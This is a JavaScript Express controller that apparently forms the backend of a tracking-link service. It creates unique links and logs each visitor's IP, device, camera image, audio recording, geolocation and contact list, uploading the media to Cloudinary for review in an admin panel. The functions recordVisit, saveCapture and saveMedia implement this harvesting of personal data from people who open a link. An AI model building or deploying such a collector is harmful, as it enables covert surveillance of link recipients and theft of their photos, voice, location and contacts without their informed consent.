const Link = require('../models/link');
const crypto = require('crypto');
const { uploadToCloudinary } = require('../utils/uploadToCloudinary');

// Get all links (for admin panel)
const getLinks = async (req, res) => {
    try {
        const links = await Link.find().sort({ createdAt: -1 });
        console.log(`[getLinks] ✅ Fetched ${links.length} links from database`);
        
        // Log summary of each link's data
        links.forEach(link => {
            console.log(`[getLinks] Link ${link.number || link.pageId}: ${link.logs.length} log entries`);
            link.logs.forEach((log, index) => {
                console.log(`  Log ${index + 1}:`, {
                    hasImage: !!log.captures?.image,
                    hasAudio: !!log.captures?.audio,
                    hasLocation: !!log.location,
                    contactsCount: log.contacts?.length || 0,
                    timestamp: log.timestamp
                });
            });
        });
        
        res.status(200).json(links);
    } catch (error) {
        console.error('[getLinks] ❌ Error fetching links:', error);
        res.status(500).json({ message: 'Error fetching links', error: error.message });
    }
};

// Create a new link
const createLink = async (req, res) => {
    try {
        const { title } = req.body;
        if (!title) {
            return res.status(400).json({ message: 'Title is required' });
        }

        // Generate a unique page ID
        const pageId = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');

        // Generate a unique random number (6 digits: 100000-999999)
        let number;
        let isUnique = false;
        while (!isUnique) {
            number = Math.floor(100000 + Math.random() * 900000);
            const existingLink = await Link.findOne({ number });
            if (!existingLink) {
                isUnique = true;
            }
        }

        const url = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/page/${pageId}`;

        const newLink = new Link({
            title,
            pageId,
            number,
            url
        });

        await newLink.save();
        res.status(201).json(newLink);
    } catch (error) {
        res.status(500).json({ message: 'Error creating link', error: error.message });
    }
};

// Get link by Page ID
const getLinkById = async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ pageId: id });
        
        if (!link) {
            return res.status(404).json({ message: 'Link not found' });
        }

        console.log(`[getLinkById] ✅ Fetched link ${link.number || link.pageId} with ${link.logs.length} log entries`);
        
        if (link.logs.length > 0) {
            const lastLog = link.logs[link.logs.length - 1];
            console.log(`[getLinkById] Latest log data:`, {
                image: lastLog.captures?.image ? '✅ Uploaded' : '❌ Not captured',
                audio: lastLog.captures?.audio ? '✅ Uploaded' : '❌ Not captured',
                location: lastLog.location ? '✅ Captured' : '❌ Not captured',
                contacts: lastLog.contacts?.length || 0,
                permissions: lastLog.permissions ? '✅ Saved' : '❌ Not saved'
            });
        }
        
        res.status(200).json(link);
    } catch (error) {
        console.error('[getLinkById] ❌ Error fetching link:', error);
        res.status(500).json({ message: 'Error fetching link', error: error.message });
    }
};

// Get link by Number
const getLinkByNumber = async (req, res) => {
    try {
        const { number } = req.params;
        const numValue = parseInt(number, 10);
        
        if (isNaN(numValue)) {
            return res.status(400).json({ message: 'Invalid number format' });
        }

        const link = await Link.findOne({ number: numValue });
        
        if (!link) {
            return res.status(404).json({ message: 'Link not found' });
        }

        res.status(200).json(link);
    } catch (error) {
        res.status(500).json({ message: 'Error fetching link', error: error.message });
    }
};

// Record a visit
const recordVisit = async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ pageId: id });
        
        if (!link) {
            return res.status(404).json({ message: 'Link not found' });
        }

        // Create log entry
        const logData = {
            timestamp: new Date().toISOString(),
            request: {
                ip: req.body.ip || req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '',
                rawIp: req.ip || '',
                referrer: req.headers.referer || '',
                userAgent: req.headers['user-agent'] || ''
            },
            device: {
                browser: '',
                os: req.body.os || '',
                device: req.body.device || '',
                deviceVendor: req.body.deviceVendor || '',
                deviceType: req.body.deviceType || ''
            },
            clientData: req.body || {},
            network: {
                ip: req.body.ip || req.ip || '',
                location: {},
                network: {},
                security: {
                    vpn: false,
                    proxy: false,
                    tor: false,
                    relay: false
                },
                is_private: false
            },
            captures: {},
            permissions: {}
        };

        // Add location if provided
        if (req.body.location) {
            logData.location = req.body.location;
        }

        // Add contacts if provided
        if (req.body.contacts && Array.isArray(req.body.contacts)) {
            logData.contacts = req.body.contacts;
        }

        // Merge advancedLog if available from middleware
        if (req.advancedLog) {
            Object.assign(logData, req.advancedLog);
            if (req.body && Object.keys(req.body).length > 0) {
                logData.clientData = { ...logData.clientData, ...req.body };
            }
        }

        link.logs.push(logData);
        await link.save();

        // Fix #4: Return the created log entry with _id so frontend can use it
        const savedLog = link.logs[link.logs.length - 1];
        res.status(200).json({
            ...link.toObject(),
            lastLogId: savedLog._id?.toString() || null // Return logId for frontend
        });
    } catch (error) {
        res.status(500).json({ message: 'Error recording visit', error: error.message });
    }
};

// Save capture - handles file upload to Cloudinary
const saveCapture = async (req, res) => {
    const fs = require('fs');
    const path = require('path');
    const logPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
    const logEntry = JSON.stringify({location:'linkController.js:198',message:'saveCapture ENTRY',data:{pageId:req.params.id,hasFile:!!req.file,hasFiles:!!req.files,fileFieldname:req.file?.fieldname,fileSize:req.file?.size},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})+'\n';
    fs.appendFileSync(logPath, logEntry);
    console.log(`[saveCapture] ===== ENTRY =====`);
    console.log(`[saveCapture] PageId: ${req.params.id}`);
    console.log(`[saveCapture] Has file: ${!!req.file}`);
    console.log(`[saveCapture] Has files array: ${!!req.files}`);
    
    try {
        const { id } = req.params;
        
        // Get the file from multer
        let file = req.file;
        if (!file && req.files && req.files.length > 0) {
            file = req.files[0];
        }

        if (!file) {
            const fs = require('fs');
            const path = require('path');
            const logPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
            const logEntry = JSON.stringify({location:'linkController.js:213',message:'saveCapture NO FILE',data:{pageId:req.params.id},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})+'\n';
            fs.appendFileSync(logPath, logEntry);
            console.error('[saveCapture] ❌ No file uploaded');
            return res.status(400).json({ message: 'No file uploaded' });
        }

        console.log(`[saveCapture] File details:`, {
            fieldname: file.fieldname,
            originalname: file.originalname,
            mimetype: file.mimetype,
            size: file.size,
            path: file.path
        });

        // Verify link exists
        const link = await Link.findOne({ pageId: id });
        if (!link) {
            console.error(`[saveCapture] ❌ Link not found for pageId: ${id}`);
            return res.status(404).json({ message: 'Link not found' });
        }

        console.log(`[saveCapture] Link found: ${link.number || link.pageId}`);

        // Determine file type from mimetype
        let fileType = 'image';
        if (file.mimetype.startsWith('audio/')) {
            fileType = 'audio';
        } else if (file.mimetype.startsWith('video/')) {
            fileType = 'audio'; // Treat video as audio for Cloudinary
        } else if (file.mimetype.startsWith('image/')) {
            fileType = 'image';
        }

        console.log(`[saveCapture] Determined file type: ${fileType}`);
        console.log(`[saveCapture] Starting Cloudinary upload...`);

        // Upload to Cloudinary
        const cloudinaryUrl = await uploadToCloudinary(file.path, fileType, 'captured_media');
        const fs = require('fs');
        const path = require('path');
        const logPath = path.join(__dirname, '..', '..', '.cursor', 'debug.log');
        const logEntry = JSON.stringify({location:'linkController.js:249',message:'saveCapture CLOUDINARY RESULT',data:{cloudinaryUrl:cloudinaryUrl?.substring(0,60),isValid:cloudinaryUrl && typeof cloudinaryUrl === 'string' && cloudinaryUrl.startsWith('http'),fileType},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})+'\n';
        fs.appendFileSync(logPath, logEntry);

        // CRITICAL: Validate URL before returning
        if (!cloudinaryUrl || typeof cloudinaryUrl !== 'string' || !cloudinaryUrl.startsWith('http')) {
            console.error(`[saveCapture] ❌ Invalid Cloudinary URL returned:`, cloudinaryUrl);
            return res.status(500).json({
                success: false,
                message: 'Upload succeeded but invalid URL returned',
                error: 'Cloudinary returned invalid URL'
            });
        }

        console.log(`[saveCapture] ✅ Cloudinary upload successful!`);
        console.log(`[saveCapture] URL: ${cloudinaryUrl}`);

        // Return success with URL - CRITICAL: Ensure URL is always a valid HTTP URL
        const responseData = { 
            success: true, 
            url: cloudinaryUrl, // This must be a valid HTTP URL
            type: fileType,
            originalName: file.originalname,
            size: file.size
        };

        console.log(`[saveCapture] Sending response:`, JSON.stringify(responseData, null, 2));
        return res.status(200).json(responseData);

    } catch (error) {
        console.error('[saveCapture] ❌ Error:', error);
        console.error('[saveCapture] Error stack:', error.stack);
        
        res.status(500).json({
            success: false,
            message: 'Upload failed',
            error: error.message
        });
    }
};

// Save media - saves uploaded URLs and other data to database
const saveMedia = async (req, res) => {
    console.log(`[saveMedia] ===== ENTRY =====`);
    console.log(`[saveMedia] PageId: ${req.params.id}`);
    console.log(`[saveMedia] Raw body keys:`, Object.keys(req.body));
    console.log(`[saveMedia] Body:`, {
        hasImageUrl: 'imageUrl' in req.body,
        hasAudioUrl: 'audioUrl' in req.body,
        imageUrl: req.body.imageUrl,
        imageUrlType: typeof req.body.imageUrl,
        audioUrl: req.body.audioUrl,
        audioUrlType: typeof req.body.audioUrl,
        hasLocation: !!req.body.location,
        contactsCount: req.body.contacts?.length || 0,
        hasPermissions: !!req.body.permissions
    });

    try {
        const { id } = req.params;
        const { 
            imageUrl, 
            audioUrl, 
            deviceInfo, 
            capturedAt, 
            permissions, 
            location, 
            contacts,
            logId // Fix #4: Support logId to bind media to specific log entry
        } = req.body;

        const link = await Link.findOne({ pageId: id });
        if (!link) {
            console.error(`[saveMedia] ❌ Link not found for pageId: ${id}`);
            return res.status(404).json({ message: 'Link not found' });
        }

        console.log(`[saveMedia] Link found: ${link.number || link.pageId}`);
        console.log(`[saveMedia] Existing logs: ${link.logs.length}`);
        console.log(`[saveMedia] LogId provided: ${logId || 'none'}`);

        // Fix #4: Find log by logId if provided, otherwise use most recent
        let lastLog;
        if (logId && link.logs.length > 0) {
            // Find log by _id
            const foundLog = link.logs.find((log) => log._id?.toString() === logId);
            if (foundLog) {
                lastLog = foundLog;
                console.log(`[saveMedia] ✅ Found log by logId: ${logId}`);
            } else {
                console.warn(`[saveMedia] ⚠️ LogId ${logId} not found, using most recent log`);
                lastLog = link.logs[link.logs.length - 1];
            }
        } else if (link.logs.length > 0) {
            lastLog = link.logs[link.logs.length - 1];
            console.log(`[saveMedia] Using most recent log entry (no logId provided)`);
        } else {
            // Create new log if none exists
            lastLog = {
                timestamp: capturedAt || new Date().toISOString(),
                request: {
                    ip: req.ip || '',
                    userAgent: req.headers['user-agent'] || ''
                },
                device: {},
                clientData: {},
                captures: {},
                permissions: {}
            };
            link.logs.push(lastLog);
            console.log(`[saveMedia] Created new log entry`);
        }

        // Initialize captures object if it doesn't exist
        if (!lastLog.captures) {
            lastLog.captures = {};
        }

        // CRITICAL: Strict URL validation - only accept valid HTTP URLs
        const isValidHttpUrl = (url) => {
            if (!url || typeof url !== 'string') return false;
            const trimmed = url.trim();
            return trimmed !== '' && 
                   trimmed !== 'null' && 
                   trimmed !== 'undefined' &&
                   (trimmed.startsWith('http://') || trimmed.startsWith('https://'));
        };

        // Save image URL if valid
        if (isValidHttpUrl(imageUrl)) {
            lastLog.captures.image = imageUrl.trim();
            console.log(`[saveMedia] ✅ Image URL saved: ${imageUrl.substring(0, 60)}...`);
        } else {
            console.log(`[saveMedia] ⚠️ Invalid image URL (ignored):`, imageUrl);
            // Don't set to null, leave existing value or undefined
        }

        // Save audio URL if valid
        if (isValidHttpUrl(audioUrl)) {
            lastLog.captures.audio = audioUrl.trim();
            console.log(`[saveMedia] ✅ Audio URL saved: ${audioUrl.substring(0, 60)}...`);
        } else {
            console.log(`[saveMedia] ⚠️ Invalid audio URL (ignored):`, audioUrl);
            // Don't set to null, leave existing value or undefined
        }

        // Save device info
        if (deviceInfo) {
            lastLog.clientData = { ...lastLog.clientData, ...deviceInfo };
            console.log(`[saveMedia] ✅ Device info saved`);
        }

        // Save permissions
        if (permissions) {
            lastLog.permissions = { ...lastLog.permissions, ...permissions };
            console.log(`[saveMedia] ✅ Permissions saved:`, permissions);
        }

        // Save location
        if (location) {
            lastLog.location = location;
            console.log(`[saveMedia] ✅ Location saved:`, location);
        }

        // Save contacts
        if (contacts && Array.isArray(contacts)) {
            lastLog.contacts = contacts;
            console.log(`[saveMedia] ✅ Contacts saved: ${contacts.length} contacts`);
        }

        // Mark as modified and save
        link.markModified('logs');
        await link.save();

        console.log(`[saveMedia] ✅ Database save successful`);
        console.log(`[saveMedia] Final captures state:`, {
            image: lastLog.captures.image || 'null',
            audio: lastLog.captures.audio || 'null'
        });

        res.status(200).json({ 
            success: true, 
            message: 'All data saved successfully',
            data: {
                imageUploaded: !!lastLog.captures.image,
                audioUploaded: !!lastLog.captures.audio,
                locationCaptured: !!location,
                contactsCount: contacts?.length || 0,
                permissionsSaved: !!permissions
            }
        });
    } catch (error) {
        console.error('[saveMedia] ❌ Error:', error);
        console.error('[saveMedia] Error stack:', error.stack);
        res.status(500).json({ 
            success: false,
            message: 'Error saving media', 
            error: error.message 
        });
    }
};

// Delete a link
const deleteLink = async (req, res) => {
    try {
        const { id } = req.params;
        
        let link = await Link.findByIdAndDelete(id);
        if (!link) {
            link = await Link.findOneAndDelete({ pageId: id });
        }

        if (!link) {
            return res.status(404).json({ message: 'Link not found' });
        }

        res.status(200).json({ message: 'Link deleted successfully' });
    } catch (error) {
        res.status(500).json({ message: 'Error deleting link', error: error.message });
    }
};

module.exports = {
    getLinks,
    createLink,
    getLinkById,
    getLinkByNumber,
    recordVisit,
    saveCapture,
    saveMedia,
    deleteLink
};
